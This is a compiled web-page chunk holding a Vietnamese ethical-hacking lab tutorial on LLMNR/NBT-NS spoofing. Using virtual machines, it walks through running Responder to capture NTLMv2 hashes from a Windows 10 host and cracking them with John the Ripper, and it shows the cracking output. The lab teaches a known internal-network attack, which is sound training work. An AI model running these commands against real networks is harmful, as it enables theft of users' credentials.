import{_ as a,c as s,a1 as t,o as e}from"./chunks/framework.BDxlaA_J.js";const d=JSON.parse('{"title":"LLMNR/NBT-NS","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/5-system-hacking/1-LLMNR-NBT-NS.md","filePath":"vi/categories/ethical-hacking-labs/5-system-hacking/1-LLMNR-NBT-NS.md"}'),i={name:"vi/categories/ethical-hacking-labs/5-system-hacking/1-LLMNR-NBT-NS.md"};function c(h,n,o,r,p,l){return e(),s("div",null,n[0]||(n[0]=[t(`<h1 id="llmnr-nbt-ns" tabindex="-1">LLMNR/NBT-NS <a class="header-anchor" href="#llmnr-nbt-ns" aria-label="Permalink to &quot;LLMNR/NBT-NS&quot;">​</a></h1><p>Link-Local Multicast Name Resolution (LLMNR) và Netbios Name Service (NBT-NS) là hai thành phần của máy tính Microsoft Windows. LLMNR được giới thiệu trong Windows Vista và là phiên bản kế nhiệm của NBT-NS.</p><p>Khi yêu cầu máy chủ tên DNS thất bại, Link-Local Multicast Name Resolution (LLMNR) và Net-BIOS Name Service (NBT-NS) được sử dụng bởi máy Windows như một phương án dự phòng. Nếu tên DNS vẫn chưa được phân giải, Windows thực hiện một broadcast UDP không xác thực tới toàn bộ mạng. Bất kỳ máy tính giả mạo nào, tuyên bố là máy chủ sẽ gửi phản hồi và thu thập thông tin xác thực của mục tiêu trong quá trình xác thực.</p><p><strong>Tấn công giả mạo LLMNR/NBT-NS</strong> là một cuộc tấn công mạng nội bộ cổ điển vẫn hoạt động, do nhận thức thấp và thực tế là nó được bật theo mặc định trong Windows.</p><p><img src="https://www.verifyit.nl/wp/wp-content/uploads/2016/12/llmnr_poison1.jpg" alt="LLMNR spoofing"></p><p>LLMNR và NBT-NS được bật theo mặc định trong Windows và có thể được sử dụng để trích xuất mã băm mật khẩu từ người dùng. Có khả năng cao thu thập được thông tin xác thực của người dùng trên mạng nội bộ.</p><p>Bằng cách lắng nghe các yêu cầu broadcast LLMNR/NBT-NS, kẻ tấn công có thể giả mạo thành máy chủ và gửi phản hồi tuyên bố là máy chủ hợp pháp. Sau khi hệ thống nạn nhân chấp nhận kết nối, kẻ tấn công có thể thu thập thông tin xác thực người dùng của nạn nhân bằng cách sử dụng công cụ như Responder.py.</p><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Thực hiện tấn công giả mạo LLMNR/NBT-NS.</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Windows 10.</li><li>Máy ảo Kali Linux.</li></ul><h2 id="su-dung-responder" tabindex="-1">Sử dụng Responder <a class="header-anchor" href="#su-dung-responder" aria-label="Permalink to &quot;Sử dụng Responder&quot;">​</a></h2><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/responder-banner.png" alt="responder banner"></p><ol><li>Khởi động và đăng nhập vào máy Windows 10. (Hãy chắc chắn chọn một mật khẩu phổ biến mà người dùng bình thường hay sử dụng - ví dụ <strong>qwerty</strong>).</li><li>Chuyển sang Kali Linux và mở cửa sổ Terminal.</li><li>Khởi động Responder để lắng nghe giao diện mạng. (Bạn có thể nhập <code>responder -h</code> để xem các tùy chọn có sẵn).</li></ol><p><code>responder -I eth0</code></p><ol start="4"><li>Bây giờ quay lại máy Windows 10 và giả sử bạn muốn truy cập một ổ đĩa mạng chia sẻ kết nối trong mạng của bạn. Khởi chạy <strong>run</strong> và nhập:</li></ol><p><code>\\\\ceh-tools</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/run-cehtools.png" alt="run"></p><h2 id="thu-thap-va-giai-ma-hash" tabindex="-1">Thu thập và Giải mã Hash <a class="header-anchor" href="#thu-thap-va-giai-ma-hash" aria-label="Permalink to &quot;Thu thập và Giải mã Hash&quot;">​</a></h2><p>Trên máy Kali, Responder bắt đầu thu thập nhật ký truy cập của máy Windows 10 như hình dưới đây:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b5a69b422beda8c658e0610af852f006af262dcf/responder-1.png" alt="responder response"></p><ol start="5"><li>Truy cập <strong>/usr/share/responder/logs/</strong> và mở file cuối cùng được tạo bởi responder:</li></ol><p><strong>SMB-NTLMv2-SSP-10.0.2.39.txt</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3e6cd9f2c6e3f1d27820e459b0d2625aa19cb229/responder-log-3.png" alt="responder log" title="Responder Log file"></p><p>Đây là các hash của người dùng đã đăng nhập được thu thập bởi responder. Bây giờ hãy giải mã các hash này.</p><p>Để giải mã mật khẩu, chúng ta sẽ sử dụng <a href="https://www.openwall.com/john/" target="_blank" rel="noreferrer">JohnTheRipper</a>.</p><ol start="6"><li>Mở một cửa sổ Terminal mới và nhập <code>john</code> cùng đường dẫn đến nhật ký responder + tên file nhật ký của bạn (lưu ý tên file có thể khác với môi trường lab của bạn):</li></ol><p><code>john /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.2.39.txt</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Using default input encoding: UTF-8</span></span>
<span class="line"><span>Loaded 4 password hashes with 4 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span></span>
<span class="line"><span>Will run 2 OpenMP threads</span></span>
<span class="line"><span>Proceeding with single, rules:Single</span></span>
<span class="line"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span></span>
<span class="line"><span>Almost done: Processing the remaining buffered candidate passwords, if any.</span></span>
<span class="line"><span>Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.</span></span>
<span class="line"><span>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>4g 0:00:00:00 DONE 2/3 (2019-12-11 13:51) 26.66g/s 357713p/s 378293c/s 378293C/s 123456..random</span></span>
<span class="line"><span>Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably</span></span>
<span class="line"><span>Session completed</span></span></code></pre></div><p>Các hash mật khẩu đã giải mã của người dùng Dummy được hiển thị trong kết quả trên.</p>`,29)]))}const m=a(i,[["render",c]]);export{d as __pageData,m as default};
